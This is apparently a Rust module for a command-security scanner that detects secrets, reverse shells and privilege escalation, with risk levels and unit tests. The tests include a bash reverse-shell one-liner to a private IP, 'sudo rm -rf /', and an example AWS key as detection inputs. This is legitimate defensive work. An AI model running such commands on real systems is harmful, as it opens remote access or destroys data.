//! Security pattern detection
//!
//! Provides pattern matching for:
//! - Secrets (API keys, tokens, passwords)
//! - Threats (reverse shells, encoded commands)
//! - Privilege escalation commands

mod privilege;
mod secrets;
mod threats;

pub use privilege::{PrivilegeMatch, PrivilegePattern, PrivilegePatternMatcher, PrivilegeType};
pub use secrets::{SecretCategory, SecretMatch, SecretPattern, SecretPatternMatcher};
pub use threats::{ThreatCategory, ThreatMatch, ThreatPattern, ThreatPatternMatcher};

use crate::SecurityResult;

/// Unified pattern matcher for all security patterns
pub struct SecurityPatternMatcher {
    secrets: SecretPatternMatcher,
    threats: ThreatPatternMatcher,
    privileges: PrivilegePatternMatcher,
}

impl SecurityPatternMatcher {
    /// Create a new security pattern matcher with default patterns
    pub fn new() -> Self {
        Self {
            secrets: SecretPatternMatcher::new(),
            threats: ThreatPatternMatcher::new(),
            privileges: PrivilegePatternMatcher::new(),
        }
    }

    /// Check for secrets in a command
    pub fn detect_secrets(&self, input: &str) -> Vec<SecretMatch> {
        self.secrets.find_all(input)
    }

    /// Check for threat patterns in a command
    pub fn detect_threats(&self, input: &str) -> Vec<ThreatMatch> {
        self.threats.find_all(input)
    }

    /// Check for privilege escalation in a command
    pub fn detect_privilege(&self, input: &str) -> Option<PrivilegeMatch> {
        self.privileges.check(input)
    }

    /// Comprehensive security check
    pub fn analyze(&self, command: &str) -> SecurityAnalysis {
        SecurityAnalysis {
            secrets: self.detect_secrets(command),
            threats: self.detect_threats(command),
            privilege: self.detect_privilege(command),
        }
    }

    /// Add custom secret pattern
    pub fn add_secret_pattern(&mut self, pattern: SecretPattern) -> SecurityResult<()> {
        self.secrets.add_pattern(pattern)
    }

    /// Add custom threat pattern
    pub fn add_threat_pattern(&mut self, pattern: ThreatPattern) -> SecurityResult<()> {
        self.threats.add_pattern(pattern)
    }
}

impl Default for SecurityPatternMatcher {
    fn default() -> Self {
        Self::new()
    }
}

/// Result of comprehensive security analysis
#[derive(Debug, Clone)]
pub struct SecurityAnalysis {
    /// Detected secrets
    pub secrets: Vec<SecretMatch>,

    /// Detected threats
    pub threats: Vec<ThreatMatch>,

    /// Privilege escalation detected
    pub privilege: Option<PrivilegeMatch>,
}

impl SecurityAnalysis {
    /// Check if any security issues were found
    pub fn has_issues(&self) -> bool {
        !self.secrets.is_empty() || !self.threats.is_empty() || self.privilege.is_some()
    }

    /// Get the highest risk level
    pub fn max_risk_level(&self) -> RiskLevel {
        let mut max = RiskLevel::None;

        for secret in &self.secrets {
            if secret.risk_level > max {
                max = secret.risk_level;
            }
        }

        for threat in &self.threats {
            if threat.risk_level > max {
                max = threat.risk_level;
            }
        }

        if let Some(ref priv_match) = self.privilege {
            if priv_match.risk_level > max {
                max = priv_match.risk_level;
            }
        }

        max
    }
}

/// Risk level enumeration
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    None = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4,
}

impl RiskLevel {
    /// Get display color (ANSI)
    pub fn color(&self) -> &'static str {
        match self {
            Self::None => "\x1b[0m",
            Self::Low => "\x1b[34m",     // Blue
            Self::Medium => "\x1b[33m",  // Yellow
            Self::High => "\x1b[91m",    // Light Red
            Self::Critical => "\x1b[31m", // Red
        }
    }

    /// Get display name
    pub fn name(&self) -> &'static str {
        match self {
            Self::None => "None",
            Self::Low => "Low",
            Self::Medium => "Medium",
            Self::High => "High",
            Self::Critical => "Critical",
        }
    }

    /// Get icon
    pub fn icon(&self) -> &'static str {
        match self {
            Self::None => "✓",
            Self::Low => "ℹ",
            Self::Medium => "⚠",
            Self::High => "⚠",
            Self::Critical => "🚨",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_security_matcher() {
        let matcher = SecurityPatternMatcher::new();

        // Test secret detection
        let secrets = matcher.detect_secrets("export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE");
        assert!(!secrets.is_empty());

        // Test threat detection
        let threats = matcher.detect_threats("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(!threats.is_empty());

        // Test privilege detection
        let priv_match = matcher.detect_privilege("sudo rm -rf /");
        assert!(priv_match.is_some());
    }

    #[test]
    fn test_risk_level_ordering() {
        assert!(RiskLevel::Critical > RiskLevel::High);
        assert!(RiskLevel::High > RiskLevel::Medium);
        assert!(RiskLevel::Medium > RiskLevel::Low);
        assert!(RiskLevel::Low > RiskLevel::None);
    }
}
